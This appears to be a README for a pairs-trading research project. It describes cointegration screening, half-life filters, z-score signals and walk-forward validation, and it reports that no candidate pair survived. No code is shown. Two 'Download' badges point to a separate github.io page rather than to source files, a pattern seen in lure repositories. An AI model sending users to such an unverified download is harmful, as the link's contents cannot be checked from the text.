<div align="center">

# 📈 Pairs Trading Research and Backtesting — Deep Dive

![preview](https://raw.githubusercontent.com/lilalunalupita/pairs-trading-research-guide/main/poster_36ef8.svg)

[![status](https://img.shields.io/badge/status-stable-2ea44f?style=flat&labelColor=0d1117)]() [![language](https://img.shields.io/badge/language-Python-2f81f7?style=flat&labelColor=0d1117)]() [![license](https://img.shields.io/badge/license-MIT-2f81f7?style=flat&labelColor=0d1117)]()

[![Download](https://raw.githubusercontent.com/lilalunalupita/pairs-trading-research-guide/main/fetch_c998e3.svg)](https://lilalunalupita.github.io/pairs-trading-research-guide/)

</div>

---

Pairs-trading research is only as trustworthy as the validation behind it, and this project is built around that premise: a cointegration-based statistical arbitrage engine that screens candidate pairs, constructs hedge-adjusted spreads, and subjects every prospect to out-of-sample walk-forward testing rather than an in-sample curve fit. The work is honest about what it found—no pair in its hand-picked universe survived validation—and documents exactly why each candidate failed, from non-significant Engle-Granger p-values to half-lives far too slow to trade. Along the way it makes a case for combining economic reasoning with statistical rigor, since neither a compelling business story nor a low p-value alone is sufficient evidence of a tradeable relationship. The result is less a strategy than a reusable methodology: a transparent research pipeline whose value lies in rejecting bad pairs before they reach capital.

## Background

Pairs trading is one of the oldest forms of statistical arbitrage, resting on the idea that two economically related assets should move together over time. When their prices diverge, the spread between them is expected to revert, creating an opportunity to go long the underperformer and short the outperformer. The concept is simple; making it hold up to scrutiny is not.

The central statistical problem is distinguishing a genuine relationship from a coincidence. Two price series can appear tightly linked in a regression while sharing no real connection, a phenomenon known as spurious regression. Non-stationary series — the kind that wander like random walks — will frequently produce high R-squared values and significant-looking coefficients purely by accident. Ordinary least squares alone cannot tell the difference between a real equilibrium and two unrelated trends that happen to overlap during the sample period. Cointegration testing exists to address this gap: it asks whether a linear combination of two non-stationary series is itself stationary, meaning the spread has a stable mean and a tendency to revert rather than drift without bound.

This project is a research and backtesting engine built around that question. It screens a candidate universe of pairs, tests each for cointegration, constructs the spread from the estimated hedge ratio, converts it to a z-score for comparable scaling across pairs, and runs a bar-by-bar backtest with entry, exit, and stop rules. Crucially, it separates the data into a development slice used for pair selection and a hold-out slice used only for validation, then applies walk-forward re-estimation on the hold-out so the hedge ratio is always fitted on past data and traded on unseen data. The design intent is to produce results that could survive contact with reality rather than a curve fitted to history.

The project is honest about what it found: no pair in the candidate universe survived that validation process. That outcome is documented rather than hidden, and the engine includes gates — a cointegration p-value threshold and a half-life ceiling — that explain precisely why each candidate failed. The codebase is intended for researchers who want a transparent, reproducible framework for testing pairs relationships, not a signal service, and it assumes familiarity with stationarity, cointegration, and the basics of backtesting methodology.

## Methodology

The research pipeline is organized as two sequential stages, screening and validation, so that candidate selection and profitability testing never draw on the same data. The first stage takes the full candidate universe and subjects each pair to cointegration diagnostics; the second stage carries forward only the top-ranked prospects and evaluates them under out-of-sample conditions. Keeping these stages separate is deliberate, since it prevents the selection step from being contaminated by the data used to judge performance.

The system is built on the following components:

- Data ingestion: The engine reads daily closing prices into a simple aligned price matrix, with each pair drawn from that shared source so that dates line up cleanly across both legs. The data is retail-grade and is treated as such throughout; the pipeline does not assume institutional-quality fills or survivorship-free history, and the limitations section states this plainly rather than papering over it.

- Cointegration screening: Every candidate pair is tested using the Engle-Granger procedure. One price is regressed on the other via ordinary least squares to recover the hedge ratio and the residual spread, and a stationarity test is then run on that residual. Because the residual was fitted to look as stationary as possible, the test uses adjusted critical values rather than the naive ones. A raw unit-root test on the residual serves as a cross-check, with the null hypothesis being that the spread contains a unit root and is therefore non-stationary. A low p-value is the evidence needed to reject that null. The half-life of the spread is then computed from the residual's autoregressive behavior to estimate how quickly it reverts. These metrics, the cointegration p-value and the half-life, are what rank pairs and determine which ones advance.

- Spread construction and z-scoring: For pairs that clear screening, the spread is built from the hedge ratio produced by the regression, taking one asset minus the hedge-adjusted other. The spread is then converted into a z-score, expressing its distance from its rolling mean in standard deviations. This normalization puts every pair on a common scale regardless of the underlying price levels, so thresholds and comparisons mean the same thing across instruments.

- Signal generation: The z-score drives entry and exit. A position opens when the spread stretches far enough from its mean and closes when it reverts to the mean. A stop closes the position if the spread stretches too far in the wrong direction, on the premise that the relationship may have broken rather than merely diverged. Position state is tracked bar by bar, since entries, exits, and stops all depend on the path the spread takes rather than on a single end-of-period snapshot.

- Backtest: Once the statistical gates are passed, a bar-by-bar backtest runs across the full price history, executing the strategy exactly as specified so that reported results reflect the same logic that would be deployed. The backtest accounts for the anti-churn rule described below, which blocks immediate re-entry into a pair that has just been stopped out.

- Walk-forward validation: Because an in-sample backtest can flatter a strategy, the data is partitioned into a development slice used for pair selection and a hold-out slice reserved for validation. Selection never sees the hold-out. On the hold-out, the hedge ratio is re-estimated on a rolling training window and the strategy trades the next unseen window, so no future information leaks into any fit. This rolling re-estimation is what makes the out-of-sample findings honest rather than a single static fit applied forward.

Two design choices shape how the methodology is applied in practice. First, economic coherence is treated as a filter alongside the statistics: a pair whose regression implies a hedge ratio with the wrong sign is rejected even if its p-value is strong, on the reasoning that two genuinely co-moving businesses should not produce an inverted relationship. Second, tradeability is gated on half-life. Cointegration alone does not make a spread tradeable, since a pair can be statistically cointegrated and still revert too slowly to generate worthwhile trades. A maximum half-life threshold is applied so that a pair must both pass the statistical test and revert fast enough to be practical. These thresholds are judgment calls, and the pipeline exposes them as configuration so that results can be reproduced and sensitivity examined rather than hidden inside the code.

## Key Points

- The project is a research and backtesting engine for cointegration-based pairs trading, built around honest out-of-sample validation rather than a curve-fit in-sample backtest. The central result is deliberately unglamorous: no pair in the screened candidate universe survives validation, and each failure is attributable to a specific, inspectable statistic.

- Cointegration is tested with the Engle-Granger two-step method, using adjusted critical values because the residual was fitted to look as stationary as possible. A raw ADF test on the residual serves as a cross-check for a unit root, and the spread's half-life is computed to gauge reversion speed.

- A two-stage design guards against p-hacking. A wide screening pass ranks candidate pairs assembled with economic reasoning in mind, and a focused second stage validates only the top prospects on data the selection never touched. Testing enough pairs will produce some that pass a significance filter by chance, so separating the wide net from the focused validation is the defense.

- Candidates are filtered by economic coherence as well as statistics. Two statistically significant stocks in unrelated businesses are treated as an illusion, and a hedge ratio with the wrong sign is grounds for rejection regardless of the p-value, since businesses that genuinely move together should not produce a backwards ratio.

- Signal generation converts the hedge-ratio spread into a z-score so pairs are comparable on one scale, entering when the spread stretches far from its mean and exiting on reversion, with a stop for relationships that appear broken.

- Walk-forward validation re-estimates the hedge ratio on a rolling training window and trades the next unseen window, ensuring no future information leaks into a fit. A separate hold-out slice is reserved for validation and never seen during selection.

- An anti-churn mechanism prevents the backtest from immediately re-entering a pair that just stopped out, reflecting the realistic behavior of steering clear of terrain that recently caused losses. Omitting this produces unrealistically favorable results.

- A tradeability gate on half-life rejects pairs that are statistically cointegrated but revert too slowly to trade. Cointegration alone is not sufficient; a spread that takes many months to revert generates too few trades to be useful.

- The data is retail-grade daily closes and the candidate universe is small and hand-picked. Thresholds for the p-value gate and half-life cutoff are judgment calls, transaction costs are modeled estimates rather than live figures, and the qualifying pairs trade so rarely that conclusions rest on very few observations. The honest reading is an absence of evidence for a tradeable edge, not proof that none exists.

- Natural extensions are a wider automated scan across sectors, which would require stricter multiple-testing correction to avoid manufacturing false positives, and moving from single pairs to trading a name against a basket of peers to average out idiosyncratic noise.

## Examples

Worked examples of the engine's behavior, drawn from the candidate universe and the diagnostics the pipeline produces. These are illustrative of the workflow rather than recommendations; the full results table lives in the project's output.

**Screening a candidate pair end to end.** A pair enters stage one as two aligned price series. The pipeline regresses one price on the other, keeps the hedge ratio and residual, runs the Engle-Granger stationarity test on that residual with adjusted critical values, cross-checks with a raw unit-root test, and computes the spread's half-life. The pair is then ranked against the rest of the universe by p-value and half-life. Only pairs clearing both the cointegration gate and the half-life gate are carried into stage two. Running a single pair through this path is the quickest way to see how the metrics relate: a low p-value with an unworkable half-life is a pass on the first gate and a fail on the second, which is the outcome the waste-hauling pair demonstrates.

**Reading the qualifies column.** The ranked table prints each pair alongside its p-value, its half-life where the first gate was cleared, and a yes/no qualifies flag. A blank half-life is meaningful, not missing data: reversion speed is undefined for a spread that never passed cointegration, so the engine leaves it empty rather than reporting a number that would invite misreading. When scanning output, the flag is the only column that decides whether a pair advances.

**Interpreting a selection-bias failure.** The tobacco pair is the clearest demonstration of what the hold-out is for. Screened on a recent five-year window alone, it showed a p-value of roughly 0.02 and a half-life inside the tradeable range, a clean pass. Screened on the earlier development slice it had never been tuned to, the same pair returned a p-value of about 0.53. Two windows, one pair, opposite conclusions. The example is useful precisely because the recent-window result looks so convincing in isolation; it is the kind of output a naive process would have shipped.

**Interpreting a statistically real but untradeable pair.** The waste-hauling pair passed cointegration on the development slice, so the relationship is not spurious in the narrow statistical sense. Its half-life came back near 190 days, well past the 60-day gate. Pushed through validation anyway, it produced a single trade across seventeen years of development data, and that trade lost money; it lost again on the hold-out under both rolling and expanding re-estimation. The example shows the two failure modes are distinct: one pair fails because the statistics were never there, this one fails because the statistics were there and the economics of reversion speed were not.

**Re-estimation under walk-forward.** In stage two the hedge ratio is not frozen at its development-slice value. The engine re-fits it on a rolling training window and trades the next unseen window, repeating forward through the hold-out. Comparing a pair's frozen-ratio backtest against its walk-forward result is the practical check on whether a fit was leaning on stale parameters; a large divergence between the two is a warning that the relationship was drifting rather than reverting.

**Adjusting the gates.** The thresholds are configuration, not constants. Raising the half-life ceiling admits slower pairs at the cost of longer holding periods and fewer trades per unit of data; tightening the p-value gate shrinks the candidate list and reduces exposure to multiple-testing luck. Because the gates live in configuration alongside the candidate universe and the development/hold-out split, any threshold change can be re-run across the full universe and compared against the baseline table. Changing the split fraction is the one adjustment to make cautiously, since moving the boundary after seeing hold-out results would quietly reintroduce the selection bias the design exists to prevent.

## References

- Gatev, Goetzmann, and Rouwenhorst's 2006 study in the *Review of Financial Studies* is the canonical empirical reference for distance-based pairs trading and remains the starting point for understanding how relative-value rules have historically performed.

- Engle and Granger's 1987 *Econometrica* paper introduced the cointegration framework and the two-step residual test that this project uses as its primary screening method; the adjusted critical values applied here follow directly from their treatment of estimated residuals.

- Avellaneda and Lee's 2010 work in *Quantitative Finance* on statistical arbitrage in US equities is the reference for the name-versus-basket extension discussed under future work, and informs the broader view that averaging idiosyncratic noise across a peer group tends to produce more stable relationships than any single pair.

- The half-life and mean-reversion speed calculations draw on the standard Ornstein-Uhlenbeck interpretation of a spread, which is treated here as background rather than a single citable source, and the 60-day tradeability gate is a judgment threshold rather than a figure taken from any one paper.

- The anti-churn logic and stop-out behavior in the backtest are not drawn from a specific published model; they reflect practical trading experience and are documented in the design decisions rather than attributed to external research.

Readers looking to reproduce or extend this work should treat the three papers above as the methodological backbone, keeping in mind that the specific thresholds, the candidate universe, and the validation split are choices made within this project and are not prescribed by the literature.

[![Download](https://raw.githubusercontent.com/lilalunalupita/pairs-trading-research-guide/main/fetch_c998e3.svg)](https://lilalunalupita.github.io/pairs-trading-research-guide/)